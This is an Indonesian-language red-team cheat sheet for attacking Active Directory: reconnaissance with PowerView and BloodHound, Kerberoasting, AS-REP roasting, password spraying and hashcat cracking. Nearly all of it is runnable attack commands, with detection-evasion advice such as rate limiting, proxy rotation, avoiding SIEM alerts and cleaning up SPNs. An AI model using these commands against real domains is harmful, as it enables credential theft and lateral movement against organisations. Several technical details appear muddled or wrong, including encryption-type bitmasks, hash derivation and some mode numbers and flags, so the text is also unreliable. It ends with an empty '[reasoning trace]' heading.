# ad-kerb — ad

# AD Recon & Kerberos — Referensi Red Team

## 1. Recon & Collection

### 1.1 PowerView (PowerSploit / dev branch, ~2024 fork)

Apa yang dikirim: LDAP bind + query ke DC (389/636), RPC/SAMR untuk enumerasi lokal.
Apa yang muncul: objek AD + atribut; output CSV/console.

```powershell
Import-Module .\PowerView.ps1
# Domain/forest context
Get-Domain -Domain corp.local
Get-DomainController -Domain corp.local
Get-ForestDomain

# Users — target kelas service (unconstrained/constrained delegation, SPN, adminCount)
Get-DomainUser -SPN | select samaccountname,serviceprincipalname,admincount,useraccountcontrol,pwdlastset
Get-DomainUser -Properties samaccountname,description,memberof | ? {$_.description -match "pass"}
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD,TRUSTED_FOR_DELEGATION,TRUSTED_TO_AUTH_FOR_DELEGATION

# Kerberoastable (SPN set, bukan krbtgt)
Get-DomainUser -SPN -AdminCount | select samaccountname,serviceprincipalname

# AS-REP roastable (DONT_REQ_PREAUTH = 0x400000)
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol

# Computers — LAPS, unconstrained delegation (TRUSTED_FOR_DELEGATION = 0x80000)
Get-DomainComputer -Unconstrained | select dnshostname,useraccountcontrol
Get-DomainComputer -Properties dnshostname,ms-Mcs-AdmPwd

# Groups & ACL
Get-DomainGroup -MemberIdentity "Domain Admins" -Recurse
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|ForceChangePassword|GenericWrite"}

# Sessions / local admin (RPC/SAMR)
Find-DomainUserLocation -UserIdentity svc_sql
Find-LocalAdminAccess -Verbose
```

Field output penting: `samaccountname`, `serviceprincipalname`, `useraccountcontrol` (bit 0x400000 = no preauth, 0x800000/0x1000000 = delegation flags), `admincount=1`, `pwdlastset`, `msds-allowedtodelegateto`, `ms-mcs-admpwd`.

Kenapa berhasil: LDAP anonymous/authenticated read default di AD. Gagal bila `RestrictQueryGroup` di-hardening, atau auditing 4662/5136 ramai dan timing tidak diacak.

### 1.2 BloodHound CE (v6+/v7) — SharpHound v2.6+

Apa yang dikirim: LDAP + SAMR + RPC (NetSessionEnum, NetWkstaUserEnum, NetLocalGroupGetMembers) + registry remote (jika diaktifkan).
Apa yang muncul: `*.zip` berisi `*.json` collection; ingest ke Neo4j → edge graph.

```powershell
# All collections, stealthy default
SharpHound.exe -c All --zipfilename corp_bh.zip
SharpHound.exe -c DCOnly                                   # minimal noise, hanya DC
SharpHound.exe -c Session,LoggedOn --Loop --LoopDuration 02:00:00
SharpHound.exe -c All --Throttle 2000 --Jitter 30          # rate-limit evasion
```

Kolektor alternatif (Linux, no .exe on disk):
```bash
bloodhound-python -u user -p 'Passw0rd!' -d corp.local -ns 10.0.0.10 -c All --zip
```

Cypher queries kunci (BloodHound CE):
```cypher
// Kerberoastable dengan path ke DA
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
// AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
// Unconstrained delegation hosts
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
// ACL abuse: GenericAll/WriteDACL ke Tier0
MATCH p=(u:User)-[:GenericAll|WriteDACL|Owns|ForceChangePassword]->(t) WHERE t.highvalue=true RETURN p
```

Edge output penting: `HasSession`, `AdminTo`, `GenericAll`, `WriteDACL`, `ForceChangePassword`, `AddMember`, `AllowedToDelegate`, `AllowedToAct`, `DCSync`, `GetChanges/GetChangesAll`, `CanRDP`, `CanPSRemote`.

Kenapa berhasil: query authenticated read + RPC anonim/terautentikasi. Gagal bila: SMB signing + `RestrictRemoteSAM` di-hardening (`Network access: Restrict clients allowed to make remote calls to SAM`), firewall blok 445/135, atau `NetSessionEnum` di-ACL (umum di hardening modern).

---

## 2. Kerberoasting

Apa yang dikirim: `AS-REQ` tanpa preauth (normal) → `TGS-REQ` untuk SPN target dengan enkripsi `rc4-hmac` (0x17) atau `aes256-cts-hmac-sha1-96` (0x12).
Apa yang muncul: `TGS-REP` berisi `enc-part` = hash yang bisa di-offline crack.
Kenapa berhasil: password akun service biasanya lemah/statis, dan tiket dienkripsi dengan kunci turunan password akun tersebut — bukan rahasia sesi.

**Aturan penting**: preauth `-rc4` hanya bisa bila akun punya `msDS-SupportedEncryptionTypes` mengizinkan RC4 atau belum diset (default: RC4+AES). Bila di-set AES-only (0x18/0x30 dengan bit RC4 off), kamu dapat `etype 18` → crack dengan mode 19700/19800 (lebih lambat).

### 2.1 GetUserSPNs.py (Impacket ≥ 0.12)

```bash
# Enumerate SPN tanpa request (recon)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10

# Request semua TGS sebagai RC4 (default pada banyak build)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -outputfile spn.hashes

# Paksa RC4 eksplisit (flag persis)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -request-user svc_sql -outputfile svc_sql.hash

# Paksa AES256 (kalau RC4 diblok, dapat etype 18)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -request-user svc_sql --aes

# Auth via NTLM hash (PtH)
GetUserSPNs.py -hashes :NTHASH corp.local/jdoe -dc-ip 10.0.0.10 -request

# Targeted (single user)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request-user svc_iis -outputfile svc_iis.hash
```

Flag persis yang sering salah dikutip:
- `-request` (bukan `--request-tgs`); wajib ada agar TGS dikirim.
- `-request-user <SAM>` , tetapi tidak boleh dikombinasi makna dengan filter SPN otomatis — pakai filter `-usersfile` bila banyak.
- `-outputfile` (satu dash di impacket modern memetakan ke `--outputfile`).
- `-target-domain` + `-dc-ip` beda domain untuk cross-trust.
- `-no-pass` untuk auth Kerberos tiket saja.

Format output (hashcat 13100):
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$<checksum>$<edata>
```
Field penting: `23` = etype RC4 (13100). Bila `18` = AES256 (mode 19700); `17` = AES128 (mode 19600).

### 2.2 Rubeus (v2.3.x)

```powershell
# Kerberoast, output hashcat format
.\Rubeus.exe kerberoast /outfile:spn.txt /format:hashcat

# Hanya user target, paksa RC4, opsec-friendly
.\Rubeus.exe kerberoast /user:svc_sql /rc4opsec /outfile:svc_sql.txt /format:hashcat

# Request via alternate cred
.\Rubeus.exe kerberoast /creduser:corp.local\jdoe /credpassword:Passw0rd! /outfile:spn.txt

# Statistik
.\Rubeus.exe kerberoast /stats

# AES (jika target AES-only; crack lebih lambat mode 19700)
.\Rubeus.exe kerberoast /user:svc_sql /aes /outfile:svc_sql_aes.txt /format:hashcat
```

Flag persis yang sering salah:
- `/rc4opsec` = jangan request RC4 untuk akun yang `msDS-SupportedEncryptionTypes` melarang (menghindari event 4769 anomali).
- `/tgtdeleg` = gunakan TGT delegasi (GSS-API) → TGS dari LSA tanpa creds eksplisit. Berguna saat tidak punya plaintext.
- `/nowrap` = jangan wrap prompt.
- `/format:hashcat` = prefix `$krb5tgs$`; tanpa ini default `john`.

### 2.3 Targeted Kerberoast untuk privesc via ACL

Apa yang dikirim: `SetSPN`/`WriteProperty` ke atribut `servicePrincipalName` pada akun target (korban) lewat ACL `GenericAll`/`GenericWrite` yang kita miliki, lalu TGS-REQ ke SPN tersebut, crack → reset password korban → pivot.
Kenapa berhasil: write access ke `servicePrincipalName` cukup untuk membuat target roastable.

PowerView:
```powershell
# Cek ACL kita ke target
Get-DomainObjectAcl -Identity victim_user -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll"}
# Set SPN (targeted kerberoast)
Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='nonexistent/whatever'} -Verbose
# Roast
.\Rubeus.exe kerberoast /user:victim_user /nowrap /format:hashcat
# Bersihkan (penting buat opsec)
Set-DomainObject -Identity victim_user -Clear serviceprincipalname
```

Alternatif impacket (dari Linux, tanpa PowerView):
```bash
targetedKerberoast.py -d corp.local -u jdoe -p 'Passw0rd!' --dc-ip 10.0.0.10 -o hashes.txt
# Output: $krb5tgs$23$*victim_user$CORP.LOCAL$nonexistent/whatever*$...
```

Cek dulu apakah target punya SPN existing (kalau iya, tidak perlu set). Jangan set SPN pada akun `krbtgt`, `computer$` DC, atau akun Tier0 tanpa izin tertulis — event 4742/5136 langsung mencurigakan.

---

## 3. AS-REP Roasting

Apa yang dikirim: `AS-REQ` dengan `preauth` **tidak** disertakan untuk user `DONT_REQ_PREAUTH`.
Apa yang muncul: `AS-REP` berisi `enc-part` = hash yang dienkripsi dengan kunci turunan password user.
Kenapa berhasil: preauth off → DC langsung kirim material terenkripsi tanpa bukti identitas.

```bash
# Impacket — enumerate & roast
GetNPUsers.py corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat -outputfile asrep.hashes
GetNPUsers.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -outputfile asrep.hashes
# Tanpa auth (anonymous bind bisa jalan di banyak forest legacy)
GetNPUsers.py corp.local/ -dc-ip 10.0.0.10 -no-pass -usersfile users.txt
```

Flag persis: `-request` = kirim AS-REQ tanpa preauth; tanpa ini hanya enumerate. `-format hashcat` bikin prefix `$krb5asrep$`. `-usersfile` wajib (atau `-request` untuk satu user via `-request-user`).

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:noauth_user /nowrap /format:hashcat
.\Rubeus.exe asreproast /domain:corp.local /dc:dc01.corp.local
```

Format output (hashcat 18200):
```
$krb5asrep$23$noauth_user@CORP.LOCAL:<checksum>$<edata>
```
Bila `18` = AES256 (mode 19900), `17` = AES128 (mode 19800).

Kenapa gagal di lapangan:
- `GetNPUsers.py` memakai `-usersfile` mode string sama sekali berbeda dari `-request-user`; flag campur → error argparse.
- Microsoft mem-push kebijakan `Kerberos policy: Do not require Kerberos preauthentication` = disabled, plus deteksi 4768 dengan `PreAuthType=0`. Di forest baru (2016+ default), nyaris tidak ada akun AS-REP-able.
- Hashcat 18200 butuh password `>= 1 char`; empty password tetap butuh mask minimal.

---

## 4. Password Spraying — SprayHound

Apa yang dikirim: satu password (atau sedikit) ke banyak akun dengan jeda — menghindari lockout.
Apa yang muncul: status `VALID`/`INVALID`/`LOCKED`/`EXPIRED` di output; bloodhound-ingest opsional.

```bash
# SprayHound (versi Go, v0.2+)
sprayhound -U users.txt -p 'Spring2025!' -d corp.local --dc-ip 10.0.0.10 --delay 2h --jitter 30 --safe

# Multiple passwords, satu putaran
sprayhound -U users.txt -P passwords.txt -d corp.local --dc-ip 10.0.0.10 --delay 30m --stop-on-lockout 1

# Ingest ke BloodHound
sprayhound -U users.txt -p 'Spring2025!' -d corp.local --dc-ip 10.0.0.10 --outfile bh_results.zip --bloodhound

# Auth via NTLM hash (pth spray)
sprayhound -U users.txt -H <NTHASH> -d corp.local --dc-ip 10.0.0.10 --delay 1h
```

Flag persis yang sering salah:
- `--safe` (sprayhound) = berhenti otomatis saat `badPwdCount + 1 == lockoutThreshold – 1` per akun; butuh read ke `ms-DS-MachineAccountQuota`? bukan — butuh akses ke atribut lockoutPolicy via LDAP (default authenticated read).
- `--stop-on-lockout N` berpijak ke event: berhenti bila `N` akun mengembalikan `LOCKED`.
- `--delay` + `--jitter` = interval antar request per akun; setidaknya >> window `LockoutObservationWindow` (default 30 menit).
- `--bloodhound` = emit JSON kompatibel CE (bukan zip langsung).

Alternatif:
```bash
# domain_password_spray (Python, lebih lambat, deteksi 4625)
python3 spray.py -U users.txt -p 'Spring2025!' -d corp.local --dc 10.0.0.10 --attempts 1 --sleep 30

# crackmapexec / nxc (spray file)
nxc smb dc01.corp.local -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce
```

Aturan operasional: **1 password per akun per jendela lockout** (AD default: threshold 5–10, window 30 menit, duration 30 menit). SprayHound default `--safe` mengirim 1 attempt per user per run. Jangan loop < window.

Field output penting: `username`, `status` (VALID/INVALID/LOCKED/EXPIRED/CHANGE_PASSWORD), `lockoutThreshold`, `remainingAttempts`. Valid → langsung simpan ke `valid-users.txt`; jangan di-spray ulang dalam jendela sama.

Kenapa gagal di lapangan:
- `--jitter` satuan detik, bukan persen; salah setting → burst.
- NTLM hash spray (PtH) tetap menaikkan `badPwdCount` → lockout sama saja.
- Account lockout policy di-GPO granular per-OU (FGPP) → threshold lebih ketat dari dugaan; sprayhound `--safe` baca `lockoutThreshold` global saja.
- Smart lockout Microsoft Entra ID (cloud) tidak terlihat dari domain policy; spray ke ADFS/Entra → lockout cloud, sisa 2 attempt.

---

## 5. Cracking (Hashcat)

### 5.1 Kerberoast RC4 — `-m 13100`

```bash
# Wordlist + rules
hashcat -m 13100 -a 0 spn.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule -O -w 4

# Mask (8 chars, uppercase+lower+digit)
hashcat -m 13100 -a 3 spn.hashes ?u?l?l?l?l?d?d?d -O -w 4

# Kombinasi (wordlist + mask append)
hashcat -m 13100 -a 6 spn.hashes rockyou.txt ?d?d -O -w 4

# Resume + potfile
hashcat -m 13100 spn.hashes --potfile-path=./k.hc.pot --status --status-timer=30
```

Format hash persis (RC4):
```
$krb5tgs$23$*USER$REALM$SPN*$<32hex checksum>$<hex edata>
```
`23` = etype 23 (RC4). Crack = derivasi NT hash → RC4 key → dekripsi edata, cek checksum.

Aturan: bila `msDS-SupportedEncryptionTypes` = 0x18 (AES128+AES256) atau 0x30 (RC4+AES128+AES256 minus RC4 0x4 bit → 0x38/0x30 varian), hashcat 13100 **gagal parse**; pakai `-m 19700` (AES256) / `-m 19600` (AES128).

### 5.2 AS-REP RC4 — `-m 18200`

```bash
hashcat -m 18200 -a 0 asrep.hashes rockyou.txt -r rules/best64.rule -O -w 4
hashcat -m 18200 -a 3 asrep.hashes ?a?a?a?a?a?a?a?a -O -w 4 --increment
```

Format hash persis:
```
$krb5asrep$23$USER@REALM:<32hex checksum>$<hex edata>
```
`23` = RC4. Crack = PBKDF2-HMAC-MD4 (atau RC4 langsung), dekripsi, verifikasi checksum.

Mode terkait:
| etype | Kerberoast | AS-REP |
|-------|-----------|--------|
| 23 (RC4) | `-m 13100` | `-m 18200` |
| 18 (AES256) | `-m 19700` | `-m 19900` |
| 17 (AES128) | `-m 19600` | `-m 19800` |

### 5.3 Named pitfalls hashcat

- `-O` (optimized kernel) menolak password >32 char untuk sebagian mode → hilangkan `-O` bila ada password panjang.
- `--username` tidak perlu; hashcat sudah parse prefix `$krb5...`.
- `-m 13100` vs `-m 13100 -O`: `-O` memotong `candidate password length` ke 31; `--increment` tidak kompatibel `-O` untuk sebagian mode.
- Crack SHA-1 base hash dual (AES modes) jauh lebih lambat (10–100× RC4); target AES-only → prioritaskan mask terarah, bukan rockyou.
- Hashcat `-w 4` + `-O` = ~2× kecepatan tapi +5–10 °C; di VM GPU passthrough (RTX 4090 ~3.5 GH/s @ 13100, ~3.6 MH/s @ 19700). Angka ini variasi driver/CUDA 12.x.

---

## 6. Jebakan Operasional — Yang Bikin Teknik Ini Gagal di Lapangan

1. **RC4 di-disable domain-wide.** Banyak forest 2022+ set `msDS-SupportedEncryptionTypes = 0x18` untuk service account, plus GPO `Network security: Configure encryption types allowed for Kerberos` tanpa RC4. Akibat: `GetUserSPNs.py -request` mengembalikan etype 18, hashcat 13100 error `No hash-mode matches`, dan waktu crack AES256 = 10–100× lebih lama. Cek dulu etype di hash (`$krb5tgs$23` vs `$18`).

2. **Preauth diwajibkan global.** Forest baru default `Kerberos policy` menutup AS-REP kosong. `GetNPUsers.py` balik `UF_DONT_REQUIRE_PREAUTH` empty. Jangan buang waktu — scan `useraccountcontrol` dulu di PowerView.

3. **AES-only + panjang password service.** Password service 25+ char random → RC4 jarang. Targeted kerberoast menang hanya bila kamu punya write ke `servicePrincipalName` pada akun dengan password lemah (biasanya IT-helpdesk atau legacy `svc_*`).

4. **Lockout granular (FGPP).** Domain policy = 5, tapi OU Finance = 3. SprayHound `--safe` baca domain policy global saja → tetap lockout. Sebelum spray, `Get-ADFineGrainedPasswordPolicy` / `msDS-PSOApplied` per target.

5. **`RestrictRemoteSAM`.** Windows 10 1809+ default `Network access: Restrict clients allowed to make remote calls to SAM = Administrators: Remote access allowed`. SharpHound `NetSessionEnum`/`NetLocalGroupGetMembers` balik `ERROR_ACCESS_DENIED`; sesi/AdminTo hilang dari graph. Fallback: `PowerView Find-DomainUserLocation` via RPC (akan gagal juga), jadi bergantung pada logon events 4624 (butuh privilege).

6. **SMB signing + SMBv1 off + firewall.** Kolom sesi (`HasSession`) butuh RPC/SMB 445 ke workstation. Di segmen VLAN user→server terisolasi (umum di jaringan 2023+), SharpHound `-c All` balik zip kosong untuk sesi. Set `-c DCOnly` + `-c Session` terpisah, jalankan dari jump host di tiap VLAN.

7. **Auditing 4769/4768 alerting SIEM.** Volume `GetUserSPNs.py -request` dari satu source IP tertangkap rule "Kerberoasting burst". Mitigasi opsec: rate limit antar request (`--delay 60`), rotate source via SOCKS proxy (`proxychains`), dan jangan pakai `-request` untuk enumerate + roast dalam satu run.

8. **Event 4742 (computer/user mod) dari targeted kerberoast.** Set/clear SPN memicu 4742 pada objek tersebut dan 5136 di DC. Jangan lupa clear SPN sesudahnya; tapi event-nya tetap tercatat. Lakukan hanya pada akun dengan owner/ACL yang tidak memonitor objek tersebut.

9. **GetUserSPNs.py dan PKINIT username format.** Pakai `corp.local/user:pass` **tanpa** `@corp.local` di username, dan `-dc-ip` selalu eksplisit. Tanpa `-dc-ip`, DNS resolution bisa ke DC site lain / port filter → `socket.timeout`.

10. **Hashcat `-O` vs cost.** Mode 13100 `-O` memotong panjang, tapi mode 19700 `-O` justru konflik — kernel tidak available optimized. Cek `hashcat -b -m 19700` sekali sebelum batch.

11. **Rubeus `/rc4opsec` false safety.** Flag ini hanya menghindari RC4 bila `msDS-SupportedEncryptionTypes` ada; bila atribut kosong (default = RC4+AES), Rubeus tetap request RC4 → 4769 dengan etype 0x17. Opsec murni bila kamu baca atribut dulu dan skip akun AES-only.

12. **SprayHound `--bloodhound` ingest.** Output JSON CE-format tapi tidak menulis zip; BloodHound CE v6+ butuh zip atau upload manual. Ini salah satu "flag persis" yang sering dikutip salah — `--outfile x.zip` **tidak** otomatis jadi format ingest; jalankan `zip -r spray_bh.zip *.json` manual.

13. **Rubeus one-liner di sistem dengan Credential Guard / LSA protection (Windows 11 24H2 + HVCI).** `/tgtdeleg` gagal masuk ke LSA → `KRB_AP_ERR_MODIFIED`. Butuh interaktif token non-restricted; sering tidak bisa via C2 injection ke proses user.

14. **Impacket versi.** `GetUserSPNs.py` lama (<0.9) tidak dukung `--aes` dan salah parse etype 18. Pakai 0.12.0+. Sama untuk `targetedKerberoast.py` butuh `ldap3 >= 2.9`.

---

## [reasoning trace]


